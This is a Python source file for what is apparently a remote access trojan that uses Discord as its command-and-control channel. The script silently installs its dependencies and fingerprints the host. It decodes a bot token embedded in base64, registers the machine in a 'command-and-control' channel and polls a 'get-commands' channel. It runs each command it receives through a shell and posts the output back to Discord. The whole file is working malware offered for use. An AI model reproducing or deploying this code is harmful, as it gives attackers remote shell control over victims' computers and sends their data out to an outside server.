#!/usr/bin/env python3

import sys
import subprocess
import importlib.util
import os
import asyncio
import platform
import uuid
import hashlib
import re
import base64
from datetime import datetime
import time

# Debug log file
DEBUG_LOG = '/tmp/hooktest_main.log'

def log_debug(message):
    """Write debug message to log file"""
    try:
        with open(DEBUG_LOG, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {message}\n")
    except:
        pass

# Required modules
REQUIRED_PACKAGES = {
    "discord": "discord.py",
    "aiohttp": "aiohttp",
}

def find_pip_command():
    """Find working pip command"""
    pip_commands = [
        [sys.executable, "-m", "pip"],
        ["pip3"],
        ["pip"],
        ["python3", "-m", "pip"],
        ["python", "-m", "pip"],
    ]
    
    for cmd in pip_commands:
        try:
            result = subprocess.run(
                cmd + ["--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5
            )
            if result.returncode == 0:
                log_debug(f"Found working pip: {' '.join(cmd)}")
                return cmd
        except:
            continue
    
    log_debug("No working pip command found")
    return None

def check_and_install_packages():
    """Check and install missing packages with multiple fallback methods"""
    log_debug("Checking required packages...")
    
    try:
        missing_packages = []
        
        # Check which modules are missing
        for module_name, package_name in REQUIRED_PACKAGES.items():
            if importlib.util.find_spec(module_name) is None:
                missing_packages.append((module_name, package_name))
                log_debug(f"Missing package: {package_name}")
        
        if not missing_packages:
            log_debug("All packages already installed")
            return True
        
        log_debug(f"Need to install: {[p[1] for p in missing_packages]}")
        
        # Find working pip
        pip_cmd = find_pip_command()
        if not pip_cmd:
            log_debug("Pip not available, trying alternative methods...")
            return try_alternative_install(missing_packages)
        
        # Try to install with pip
        for module_name, package_name in missing_packages:
            try:
                log_debug(f"Installing {package_name} with pip...")
                
                cmd = pip_cmd + [
                    "install", 
                    package_name,
                    "--user",
                    "--quiet",
                    "--disable-pip-version-check",
                    "--no-warn-script-location"
                ]
                
                result = subprocess.run(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=120,
                    text=True
                )
                
                if result.returncode == 0:
                    log_debug(f"Successfully installed: {package_name}")
                else:
                    log_debug(f"Failed to install {package_name}: {result.stderr[:200]}")
                    
                    # Try without --user flag
                    cmd_no_user = [c for c in cmd if c != "--user"]
                    cmd_no_user.append("--break-system-packages")
                    
                    result2 = subprocess.run(
                        cmd_no_user,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=120,
                        text=True
                    )
                    
                    if result2.returncode == 0:
                        log_debug(f"Installed {package_name} with --break-system-packages")
                    else:
                        log_debug(f"Still failed: {result2.stderr[:200]}")
                        return False
                    
            except Exception as e:
                log_debug(f"Exception installing {package_name}: {e}")
                return False
        
        # Verify installation
        time.sleep(1)
        for module_name, package_name in missing_packages:
            if importlib.util.find_spec(module_name) is None:
                log_debug(f"Verification failed: {module_name} still not available")
                return False
        
        log_debug("All packages installed and verified")
        return True
        
    except Exception as e:
        log_debug(f"Exception in check_and_install_packages: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return False

def try_alternative_install(missing_packages):
    """Try alternative installation methods when pip is not available"""
    log_debug("Attempting alternative installation methods...")
    
    try:
        # Method 1: Try ensurepip
        try:
            import ensurepip
            log_debug("ensurepip available, bootstrapping pip...")
            ensurepip.bootstrap()
            return check_and_install_packages()  # Retry with pip
        except:
            log_debug("ensurepip not available")
        
        # Method 2: Check if packages are already in system paths
        log_debug("Checking system Python paths...")
        for path in sys.path:
            log_debug(f"Path: {path}")
        
        # Method 3: Try apt-get for system packages (Linux only)
        if platform.system() == "Linux":
            try:
                log_debug("Trying apt-get install...")
                for module_name, package_name in missing_packages:
                    apt_package = f"python3-{module_name}"
                    subprocess.run(
                        ["apt-get", "install", "-y", apt_package],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=60
                    )
                return True
            except:
                log_debug("apt-get not available or failed")
        
        log_debug("All alternative methods failed")
        return False
        
    except Exception as e:
        log_debug(f"Exception in alternative install: {e}")
        return False

def import_discord_modules():
    """Import Discord-related modules after installation"""
    try:
        global discord, aiohttp
        
        log_debug("Attempting to import discord...")
        import discord
        log_debug(f"Discord imported: {discord.__version__}")
        
        log_debug("Attempting to import aiohttp...")
        import aiohttp
        log_debug(f"aiohttp imported: {aiohttp.__version__}")
        
        log_debug("All Discord modules imported successfully")
        return True
        
    except ImportError as e:
        log_debug(f"Import error: {e}")
        
        # Try adding common installation paths
        possible_paths = [
            os.path.expanduser("~/.local/lib/python3.13/site-packages"),
            os.path.expanduser("~/.local/lib/python3.12/site-packages"),
            os.path.expanduser("~/.local/lib/python3.11/site-packages"),
            "/usr/local/lib/python3.13/site-packages",
            "/usr/local/lib/python3.12/site-packages",
            "/usr/lib/python3/dist-packages",
        ]
        
        for path in possible_paths:
            if os.path.exists(path) and path not in sys.path:
                log_debug(f"Adding to sys.path: {path}")
                sys.path.insert(0, path)
        
        # Try importing again
        try:
            import discord
            import aiohttp
            log_debug("Successfully imported after adding paths")
            return True
        except:
            log_debug("Still cannot import after adding paths")
            return False
            
    except Exception as e:
        log_debug(f"Unexpected error importing modules: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return False

# Client globals
SESSION_ID = None
CLIENT_INFO = None
COMMAND_AND_CONTROL_CHANNEL = None
GET_COMMANDS_CHANNEL = None
COMMAND_RESULTS_CHANNEL = None
last_processed_message_id = None

def generate_session_id():
    """Generate unique session ID based on system info"""
    try:
        system_info = (
            platform.system() +
            platform.node() +
            platform.machine() +
            platform.release() +
            str(uuid.getnode())
        )
        hashed = hashlib.sha256(system_info.encode()).hexdigest()
        session_id = "session_" + hashed
        log_debug(f"Generated session ID: {session_id}")
        return session_id
    except Exception as e:
        log_debug(f"Error generating session ID: {e}")
        return "session_" + str(uuid.uuid4())

async def create_client():
    """Create Discord client with custom settings"""
    try:
        log_debug("Creating Discord client...")
        
        connector = aiohttp.TCPConnector(
            resolver=aiohttp.AsyncResolver(nameservers=['8.8.8.8', '1.1.1.1']),
            family=0,
            ssl=False
        )
        
        intents = discord.Intents.default()
        intents.message_content = True
        intents.guilds = True
        
        client = discord.Client(intents=intents, connector=connector)
        log_debug("Discord client created successfully")
        return client
    except Exception as e:
        log_debug(f"Failed to create client: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return None

async def register_session(guild, client_instance):
    """Register session with bot"""
    try:
        log_debug(f"Registering session with guild: {guild.name}")
        channel = guild.get_channel(COMMAND_AND_CONTROL_CHANNEL)
        if channel:
            await channel.send(f'/register {SESSION_ID} {CLIENT_INFO}')
            log_debug("Registration message sent")
    except Exception as e:
        log_debug(f"Failed to register session: {e}")

def parse_command_message(content):
    """Parse command from message"""
    try:
        lines = content.split('\n')
        command_id = None
        session = None
        command = None
        
        for line in lines:
            if 'Command ID:' in line:
                command_id = line.split('Command ID:')[1].strip()
            elif 'Session:' in line:
                m = re.search(r"session_[0-9a-fA-F]{64}", line)
                session = m.group(0) if m else None
                log_debug(f"Session line: {session}")

            elif 'Command:' in line:
                match = re.search(r"```(.*?)```", line, re.DOTALL)
                if match:
                    command = match.group(1).strip()
                    log_debug(f"Command line: {command}")

        
        if command_id and session and command:
            return {
                'command_id': command_id,
                'session': session,
                'command': command
            }
        return None
    except Exception as e:
        log_debug(f"Error parsing command: {e}")
        import traceback
        log_debug(traceback.format_exc())
        return None

async def execute_command(command):
    """Execute system command"""
    try:
        log_debug(f"Executing command: {command[:50]}...")
        
        if platform.system() == 'Windows':
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
        else:
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                executable='/bin/bash'
            )
        
        stdout, stderr = process.communicate(timeout=30)
        
        if process.returncode == 0:
            result = stdout if stdout else 'Command executed successfully'
        else:
            result = f'Error: {stderr if stderr else "Command failed"}'
        
        if len(result) > 1900:
            result = result[:1900] + '\n... (truncated)'
        
        log_debug(f"Command result: {result[:100]}...")
        return result
        
    except subprocess.TimeoutExpired:
        log_debug("Command timeout")
        return 'Error: Timeout'
    except Exception as e:
        log_debug(f"Command execution error: {e}")
        return f'Error: {str(e)}'

async def send_response(command_id, command, response, client_instance):
    """Send command response"""
    try:
        log_debug(f"Sending response for command {command_id}")
        
        channel = client_instance.get_channel(COMMAND_AND_CONTROL_CHANNEL)
        if channel:
            await channel.send(
                f'**Response for {command_id}**\n'
                f'**Session:** {SESSION_ID}\n'
                f'**Command:** ```{command[:100]}```\n'
                f'**Response:** ```{response}```'
            )
            log_debug("Response sent to command-and-control")
        
        results_channel = client_instance.get_channel(COMMAND_RESULTS_CHANNEL)
        if results_channel:
            await results_channel.send(
                f'**Command ID:** {command_id}\n'
                f'**Session:** {SESSION_ID}\n'
                f'**Command:** ```{command}```\n'
                f'**Response:** ```{response}```\n'
                f'**Timestamp:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
            )
            log_debug("Response sent to command-results")
            
    except Exception as e:
        log_debug(f"Failed to send response: {e}")

async def poll_commands(client_instance):
    """Poll for commands"""
    global last_processed_message_id
    
    try:
        log_debug("Starting command polling loop")
        await asyncio.sleep(5)
        
        while True:
            try:
                channel = client_instance.get_channel(GET_COMMANDS_CHANNEL)
                if not channel:
                    await asyncio.sleep(10)
                    continue
                
                messages = [msg async for msg in channel.history(limit=1)]
                
                if messages:
                    latest_message = messages[0]
                    
                    if last_processed_message_id != latest_message.id:
                        log_debug(f"New message detected: {latest_message.id}")
                        log_debug(f"Message content: {latest_message.content}")
                        
                        command_data = parse_command_message(latest_message.content)
                        
                        if command_data:
                            log_debug(f"Parsed command - ID: {command_data['command_id']}, Session: {command_data['session']}")
                            log_debug(f"Our session: {SESSION_ID}")
                            
                            if command_data["session"] == SESSION_ID:
                                log_debug(f"Command is for this session: {command_data['command_id']}")
                                response = await execute_command(command_data['command'])
                                await send_response(
                                    command_data['command_id'],
                                    command_data['command'],
                                    response,
                                    client_instance
                                )
                                last_processed_message_id = latest_message.id
                            else:
                                log_debug("Command is for different session, ignoring")
                        else:
                            log_debug("Failed to parse command message")
                
                await asyncio.sleep(3)
                
            except Exception as e:
                log_debug(f"Error in poll loop: {e}")
                import traceback
                log_debug(traceback.format_exc())
                await asyncio.sleep(10)
                
    except Exception as e:
        log_debug(f"Fatal error in polling: {e}")
        import traceback
        log_debug(traceback.format_exc())

async def setup_client_events(client_instance):
    """Setup client event handlers"""
    global COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
    
    @client_instance.event
    async def on_ready():
        global COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
        
        try:
            log_debug(f"Client connected as {client_instance.user.name}")
            log_debug(f"Connected to {len(client_instance.guilds)} guilds")
            
            guild = client_instance.guilds[0] if client_instance.guilds else None
            if guild:
                log_debug(f"Guild: {guild.name}")
                
                for channel in guild.text_channels:
                    log_debug(f"Found channel: {channel.name}")
                    
                    if channel.name == 'command-and-control':
                        COMMAND_AND_CONTROL_CHANNEL = channel.id
                        log_debug(f"Set command-and-control: {channel.id}")
                    elif channel.name == 'get-commands':
                        GET_COMMANDS_CHANNEL = channel.id
                        log_debug(f"Set get-commands: {channel.id}")
                    elif channel.name == 'command-results':
                        COMMAND_RESULTS_CHANNEL = channel.id
                        log_debug(f"Set command-results: {channel.id}")
                
                if all([COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL]):
                    log_debug("All channels found, registering session")
                    await register_session(guild, client_instance)
                    client_instance.loop.create_task(poll_commands(client_instance))
                    log_debug("Polling task started")
                else:
                    log_debug("Missing channels!")
                    log_debug(f"C&C: {COMMAND_AND_CONTROL_CHANNEL}, Get: {GET_COMMANDS_CHANNEL}, Results: {COMMAND_RESULTS_CHANNEL}")
            else:
                log_debug("No guild found!")
                
        except Exception as e:
            log_debug(f"Error in on_ready: {e}")
            import traceback
            log_debug(traceback.format_exc())

async def run_discord_client():
    """Main function to run Discord client"""
    global SESSION_ID, CLIENT_INFO
    
    try:
        log_debug("=== DISCORD AGENT STARTING ===")
        
        # Install dependencies
        log_debug("Installing dependencies...")
        if not check_and_install_packages():
            log_debug("Failed to install dependencies, trying to continue anyway...")
        
        # Import modules
        if not import_discord_modules():
            log_debug("Failed to import Discord modules - CANNOT CONTINUE")
            return
        
        # Generate session info
        SESSION_ID = generate_session_id()
        CLIENT_INFO = f'{platform.system()} {platform.release()} - {platform.node()}'
        log_debug(f"Client info: {CLIENT_INFO}")
        
        # Decode token
        TOKEN = base64.b64decode(
            "TVRRek5UazBPVGcwTURjeE56VTRNalE0T1EuR3F4OW11LnRHeno5alVEZTVGeGhJc19Oa0h2MFA5WmxpT2o3X1o0LVVOdXF3"
        ).decode('utf-8')
        log_debug("Token decoded")
        
        if not TOKEN:
            log_debug("No token available")
            return
        
        # Create and run client
        client = await create_client()
        if not client:
            log_debug("Failed to create client")
            return
        
        await setup_client_events(client)
        log_debug("Starting Discord client...")
        
        await client.start(TOKEN)
        
    except Exception as e:
        log_debug(f"Fatal error in run_discord_client: {e}")
        import traceback
        log_debug(traceback.format_exc())

def start_discord_agent():
    """Entry point - start Discord agent"""
    try:
        log_debug("=== START_DISCORD_AGENT CALLED ===")
        
        # Create new event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        log_debug("Event loop created")
        
        # Run client
        loop.run_until_complete(run_discord_client())
        
    except Exception as e:
        log_debug(f"Error in start_discord_agent: {e}")
        import traceback
        log_debug(traceback.format_exc())

# Main execution
if __name__ == "__main__":
    start_discord_agent()